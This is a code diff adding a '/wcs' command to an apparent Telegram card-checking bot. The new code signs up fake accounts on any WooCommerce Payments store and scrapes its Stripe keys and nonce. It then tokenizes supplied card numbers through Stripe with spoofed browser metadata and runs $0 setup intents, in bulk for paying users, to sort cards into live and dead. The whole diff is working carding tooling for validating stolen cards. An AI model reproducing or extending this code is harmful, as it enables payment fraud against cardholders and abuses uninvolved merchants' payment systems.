@@ -2298,6 +2298,7 @@ def cmds_command(message):
         "  🛡️ /vbv  » Braintree 3DS Single  <i>└ $2.00 auth</i>\n"
         "  🛡️ /vbvm » Braintree 3DS Mass  <i>└ up to 500 cards</i>\n"
         "  🟢 /b3   » Braintree $0 Auth  <i>└ bandc gate · no charge</i>\n"
+        "  🔵 /wcs  » WooCommerce Stripe Auth  <i>└ any wcpay site · $0</i>\n"
         "  ⚡ /st   » Stripe Charge  <i>└ direct · ultra fast</i>\n"
         "  🔐 /sa   » Stripe Auth Only  <i>└ no charge</i>\n"
         "  🚀 /stm  » Stripe Mass  <i>└ multiple cards</i>\n"
@@ -5853,6 +5854,378 @@ def b3_command(message):
         try:
             bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                   text=build_b3_msg("✅ DONE"), parse_mode='HTML')
+        except: pass
+
+    threading.Thread(target=my_function).start()
+
+
+# ================== /wcs — WooCommerce Stripe Auth ($0 setup intent) ==================
+_wcs_site_cache = {}   # site_url → {email, password, session} cache for speed
+
+def _wcs_call(site: str, card: str):
+    """Stripe $0 auth via WooCommerce Payments (wcpay) on any compatible site."""
+    import time, uuid, re as _re, string
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+    from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+    parts = card.split('|')
+    if len(parts) < 4:
+        return {"status": "error", "message": "Invalid card format", "elapsed": 0}
+    cn, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip()[-2:], parts[3].strip()
+
+    site = site.rstrip('/')
+    if not site.startswith(('http://', 'https://')):
+        site = 'https://' + site
+
+    UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+    base_headers = {
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'User-Agent': UA,
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+    }
+
+    t0 = time.time()
+    try:
+        # ── Step 1: Register or reuse cached account ──────────────────────
+        sess = requests.Session()
+        retry = Retry(total=3, backoff_factor=0.5, raise_on_status=False, allowed_methods=False)
+        sess.mount('https://', HTTPAdapter(max_retries=retry))
+        sess.headers.update(base_headers)
+
+        cached = _wcs_site_cache.get(site)
+        if cached:
+            email, password = cached['email'], cached['password']
+            # Re-login with cached credentials
+            r = sess.get(f'{site}/my-account/', timeout=15)
+            lnonce = _re.search(r'name="woocommerce-login-nonce" value="(.*?)"', r.text)
+            if lnonce:
+                sess.post(f'{site}/my-account/', headers={
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': site, 'referer': f'{site}/my-account/',
+                }, data={
+                    'username': email, 'password': password,
+                    'woocommerce-login-nonce': lnonce.group(1),
+                    '_wp_http_referer': '/my-account/', 'login': 'Log in',
+                }, timeout=15)
+        else:
+            # Register fresh account
+            r = sess.get(f'{site}/my-account/', timeout=15)
+            rnonce = _re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text)
+            if not rnonce:
+                return {"status": "error", "message": "Register nonce not found — site may not support wcpay", "elapsed": round(time.time()-t0,2)}
+            email    = ''.join(random.choices(string.ascii_lowercase, k=8)) + str(random.randint(10,99)) + '@gmail.com'
+            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+            r2 = sess.post(f'{site}/my-account/', headers={
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': site, 'referer': f'{site}/my-account/',
+                'Cache-Control': 'no-cache',
+            }, data={
+                'email': email, 'password': password,
+                'woocommerce-register-nonce': rnonce.group(1),
+                '_wp_http_referer': '/my-account/', 'register': 'Register',
+            }, timeout=20)
+            if 'woocommerce-error' in r2.text and 'already' not in r2.text.lower():
+                err_m = _re.search(r'<li>(.*?)</li>', r2.text[r2.text.find('woocommerce-error'):])
+                emsg  = err_m.group(1)[:80] if err_m else 'Registration failed'
+                from bs4 import BeautifulSoup
+                emsg  = BeautifulSoup(emsg, 'html.parser').get_text()[:80]
+                return {"status": "error", "message": emsg, "elapsed": round(time.time()-t0,2)}
+            _wcs_site_cache[site] = {'email': email, 'password': password}
+
+        # ── Step 2: Get Stripe keys from add-payment-method page ──────────
+        r = sess.get(f'{site}/my-account/add-payment-method/', timeout=15)
+        html = r.text
+        pks_m   = _re.search(r'"publishableKey"\s*:\s*"([^"]+)"', html)
+        acct_m  = _re.search(r'"accountId"\s*:\s*"([^"]+)"', html)
+        nonce_m = _re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', html)
+
+        if not pks_m or not nonce_m:
+            return {"status": "error", "message": "WCPay Stripe keys not found — site may not use WooCommerce Payments", "elapsed": round(time.time()-t0,2)}
+
+        pks   = pks_m.group(1)
+        acct  = acct_m.group(1) if acct_m else ''
+        nonce = nonce_m.group(1)
+
+        # ── Step 3: Tokenize card via Stripe API ──────────────────────────
+        sess_id = str(uuid.uuid4())
+        stripe_data = (
+            f'billing_details[name]=John+Smith'
+            f'&billing_details[email]={email}'
+            f'&billing_details[address][country]=US'
+            f'&type=card'
+            f'&card[number]={cn}'
+            f'&card[cvc]={cvc}'
+            f'&card[exp_year]={yy}'
+            f'&card[exp_month]={mm}'
+            f'&allow_redisplay=unspecified'
+            f'&payment_user_agent=stripe.js%2F065b474d33%3B+stripe-js-v3%2F065b474d33%3B+payment-element%3B+deferred-intent'
+            f'&referrer={site}'
+            f'&time_on_page={random.randint(60000,300000)}'
+            f'&client_attribution_metadata[client_session_id]={sess_id}'
+            f'&client_attribution_metadata[merchant_integration_source]=elements'
+            f'&client_attribution_metadata[merchant_integration_subtype]=payment-element'
+            f'&client_attribution_metadata[payment_intent_creation_flow]=deferred'
+            f'&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
+            f'&guid={uuid.uuid4()}'
+            f'&muid={uuid.uuid4()}'
+            f'&sid={uuid.uuid4()}'
+            f'&key={pks}'
+            + (f'&_stripe_account={acct}' if acct else '')
+        )
+        sr = requests.post('https://api.stripe.com/v1/payment_methods', headers={
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': UA,
+        }, data=stripe_data, timeout=20)
+        sr_json = sr.json()
+
+        if 'error' in sr_json:
+            err = sr_json['error']
+            return {"status": "dead", "message": err.get('message', 'Tokenization failed')[:80], "elapsed": round(time.time()-t0,2)}
+
+        pm_id = sr_json.get('id', '')
+        if not pm_id:
+            return {"status": "error", "message": "No payment method ID returned", "elapsed": round(time.time()-t0,2)}
+
+        # ── Step 4: Create setup intent ───────────────────────────────────
+        mp_data = MultipartEncoder({
+            'action':                (None, 'create_setup_intent'),
+            'wcpay-payment-method':  (None, pm_id),
+            '_ajax_nonce':           (None, nonce),
+        })
+        ir = sess.post(f'{site}/wp-admin/admin-ajax.php', headers={
+            'Accept': '*/*',
+            'Content-Type': mp_data.content_type,
+            'Origin': site,
+            'Referer': f'{site}/my-account/add-payment-method/',
+            'User-Agent': UA,
+        }, data=mp_data, timeout=30)
+
+        elapsed = round(time.time()-t0, 2)
+
+        try:
+            resp = ir.json()
+        except Exception:
+            return {"status": "error", "message": f"Invalid JSON: {ir.text[:80]}", "elapsed": elapsed}
+
+        result_val = resp.get('result', '')
+        # Success
+        if result_val == 'success' or resp.get('status') == 'succeeded':
+            return {"status": "approved", "message": "Approved — $0 Auth", "elapsed": elapsed}
+
+        # 3DS required
+        cs = resp.get('client_secret', '')
+        if cs or 'requires_action' in str(resp):
+            return {"status": "approved", "message": "OTP / 3DS Required", "elapsed": elapsed}
+
+        # Failure — extract message
+        if result_val == 'failure' or 'messages' in resp:
+            raw_msg = resp.get('messages', resp.get('message', str(resp)))
+            from bs4 import BeautifulSoup
+            clean = BeautifulSoup(str(raw_msg), 'html.parser').get_text()[:80]
+            # Sub-classify
+            cl = clean.lower()
+            if any(x in cl for x in ('insufficient', 'funds')):
+                return {"status": "dead", "message": "Insufficient Funds", "elapsed": elapsed}
+            if any(x in cl for x in ('otp','3d','authenticat','secure','verify')):
+                return {"status": "approved", "message": "OTP / 3DS Required", "elapsed": elapsed}
+            return {"status": "dead", "message": clean, "elapsed": elapsed}
+
+        return {"status": "dead", "message": str(resp)[:80], "elapsed": elapsed}
+
+    except Exception as e:
+        return {"status": "error", "message": str(e)[:80], "elapsed": round(time.time()-t0,2)}
+
+
+@bot.message_handler(commands=["wcs"])
+def wcs_command(message):
+    def my_function():
+        id = message.from_user.id
+        with open("data.json", 'r', encoding='utf-8') as f:
+            json_data = json.load(f)
+        try:
+            BL = json_data[str(id)]['plan']
+        except:
+            BL = '𝗙𝗥𝗘𝗘'
+        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
+            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode='HTML')
+            return
+
+        usage_msg = (
+            "<b>🔵 WooCommerce Stripe Auth\n\n"
+            "📌 Single card:\n"
+            "/wcs https://site.com 4111111111111111|12|26|123\n\n"
+            "📌 Multi card:\n"
+            "/wcs https://site.com\n"
+            "card1|mm|yy|cvv\n"
+            "card2|mm|yy|cvv\n\n"
+            "⚡ Site must use WooCommerce Payments (wcpay)</b>"
+        )
+
+        # ── Parse site URL + cards ─────────────────────────────────────────
+        try:
+            lines = message.text.split('\n')
+            first_parts = lines[0].split(None, 2)   # [cmd, site?, card?]
+            if len(first_parts) < 2:
+                raise IndexError
+
+            site_url = first_parts[1].strip()
+            if not site_url.startswith('http') and '.' not in site_url:
+                raise ValueError
+
+            raw_lines = []
+            if len(first_parts) == 3:                       # inline card on first line
+                raw_lines.append(first_parts[2])
+            if len(lines) > 1:                              # cards on subsequent lines
+                raw_lines += [l.strip() for l in lines[1:] if l.strip()]
+        except (IndexError, ValueError):
+            bot.reply_to(message, usage_msg, parse_mode='HTML')
+            return
+
+        card_lines = []
+        for rl in raw_lines:
+            cc = _extract_cc(rl)
+            if cc:
+                card_lines.append(cc)
+
+        if not card_lines:
+            bot.reply_to(message,
+                "<b>❌ Invalid card format.\n"
+                "Correct: <code>4111111111111111|12|26|123</code></b>", parse_mode='HTML') if raw_lines else bot.reply_to(message, usage_msg, parse_mode='HTML')
+            return
+
+        if len(card_lines) > 50:
+            bot.reply_to(message, "<b>❌ Maximum 50 cards at a time.</b>", parse_mode='HTML')
+            return
+
+        # ── Single card ────────────────────────────────────────────────────
+        if len(card_lines) == 1:
+            card    = card_lines[0]
+            bin_num = card.replace('|','')[:6]
+            bin_info, bank, country, country_code = get_bin_info(bin_num)
+            log_command(message, query_type='gateway', gateway='wcs')
+            msg = bot.reply_to(message,
+                f"<b>⏳ Checking [WCS Auth]...\n"
+                f"🌐 Site: <code>{site_url[:50]}</code>\n"
+                f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')
+
+            result  = _wcs_call(site_url, card)
+            s       = result.get("status","").lower()
+            m       = result.get("message","")
+            elapsed = result.get("elapsed",0)
+
+            if s == "approved":
+                em, word = ("⚡","OTP") if "OTP" in m else ("✅","Approved")
+            elif s == "dead":
+                em, word = "❌", "Dead"
+            else:
+                em, word = "🔴", "Error"
+
+            log_card_check(id, card, 'wcs', m[:80])
+            out = (
+                f"<b>{em} {word}  ❯  <code>{card}</code>\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"🏦 BIN: {bin_num}  •  {bin_info}\n"
+                f"🏛️ Bank: {bank}\n"
+                f"🌍 Country: {country} {country_code}\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"🌐 Site: {site_url[:50]}\n"
+                f"🎯 Gate: WooCommerce Stripe ($0)\n"
+                f"💬 Msg: {m[:80]}\n"
+                f"⏱️ Time: {elapsed}s\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"[⌤] Bot by @yadistan</b>"
+            )
+            bot.edit_message_text(out, message.chat.id, msg.message_id, parse_mode='HTML')
+            return
+
+        # ── Bulk ──────────────────────────────────────────────────────────
+        total    = len(card_lines)
+        approved = dead = err = otp = checked = 0
+        results_lines = []
+        hits = []
+
+        stop_kb = types.InlineKeyboardMarkup()
+        stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
+        try:
+            stopuser[f'{id}']['status'] = 'start'
+        except:
+            stopuser[f'{id}'] = {'status': 'start'}
+
+        log_command(message, query_type='gateway', gateway='wcs')
+        msg = bot.reply_to(message,
+            f"<b>🔵 WCS Auth | {site_url[:40]}\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"📋 Total: {total} cards\n⏳ Starting...</b>",
+            reply_markup=stop_kb, parse_mode='HTML')
+
+        def build_wcs_msg(status_text="⏳ Checking..."):
+            header = (f"<b>🔵 WCS Auth | {status_text}\n"
+                      f"━━━━━━━━━━━━━━━━━━━━\n"
+                      f"🌐 {site_url[:45]}\n"
+                      f"📊 {checked}/{total} | ✅ {approved} | ⚡ {otp} | ❌ {dead} | 🔴 {err}\n"
+                      f"━━━━━━━━━━━━━━━━━━━━\n")
+            body = "\n".join(results_lines[-10:])
+            footer_hits = ""
+            if hits:
+                hits_lines = "".join(
+                    f"\n{hem} <b>{hw}</b>\n<code>{hcc}</code>\n<b>Msg:</b> {hres.get('message','')[:60]}\n<b>Time:</b> {hres.get('elapsed',0):.2f}s\n"
+                    for hcc, hres, hem, hw in hits[-5:]
+                )
+                footer_hits = f"\n━━━━━━━━━━━━━━━━━━━━\n🎯 HITS ({len(hits)}):" + hits_lines
+            full = header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"
+            if len(full) > 4000:
+                full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n[⌤] Bot by @yadistan</b>"
+            return full
+
+        for cc in card_lines:
+            if stopuser.get(f'{id}', {}).get('status') == 'stop':
+                try:
+                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
+                                          text=build_wcs_msg("🛑 STOPPED"), parse_mode='HTML')
+                except: pass
+                return
+
+            result  = _wcs_call(site_url, cc)
+            checked += 1
+            s       = result.get("status","").lower()
+            m       = result.get("message","")
+            log_card_check(id, cc, 'wcs', m[:80])
+
+            if s == "approved" and "OTP" in m:
+                em, word = "⚡", "OTP"
+                otp += 1
+                hits.append((cc, result, em, word))
+            elif s == "approved":
+                em, word = "✅", "Approved"
+                approved += 1
+                hits.append((cc, result, em, word))
+            elif s == "error":
+                em, word = "🔴", "Error"
+                err += 1
+            else:
+                em, word = "❌", "Dead"
+                dead += 1
+
+            results_lines.append(f"{em} <b>{word}</b> — {m[:50]}  ❯  <code>{cc}</code>")
+
+            if checked % 3 == 0 or checked == total:
+                try:
+                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
+                                          text=build_wcs_msg(), parse_mode='HTML', reply_markup=stop_kb)
+                    time.sleep(0.5)
+                except Exception:
+                    time.sleep(1)
+
+        try:
+            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
+                                  text=build_wcs_msg("✅ DONE"), parse_mode='HTML')
         except: pass
 
     threading.Thread(target=my_function).start()
